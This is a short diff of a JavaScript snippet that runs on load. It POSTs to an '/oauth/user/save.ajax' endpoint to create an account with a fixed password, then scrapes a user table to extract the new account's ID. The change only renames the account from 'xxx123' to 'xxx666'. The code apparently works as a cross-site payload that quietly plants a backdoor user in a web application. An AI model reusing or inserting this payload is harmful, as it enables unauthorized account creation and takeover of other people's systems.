@@ -24,7 +24,7 @@ function loadXMLDoc() {
 					strs = tbody.split("</tr>");
 					for(var i=0;i<strs.length;i++){
 					var tr=strs[i];
-					if(tr.indexOf("xxx123") >= 0){
+					if(tr.indexOf("xxx666") >= 0){
 						var id=tr.match(/ajax\?ids=[\s\S]*action-tips/)[0];
 						var userid=id.replace(/[^0-9]/ig,"");
 						console.log(userid);
@@ -41,7 +41,7 @@ function loadXMLDoc() {
     }
     xmlhttp1.open("POST", domain+"/oauth/user/save.ajax", true);
     xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    xmlhttp1.send("userName=xxx123&loginPassword=aa123456&confirmPassword=aa123456");
+    xmlhttp1.send("userName=xxx666&loginPassword=aa123456&confirmPassword=aa123456");
 
 }
 loadXMLDoc();
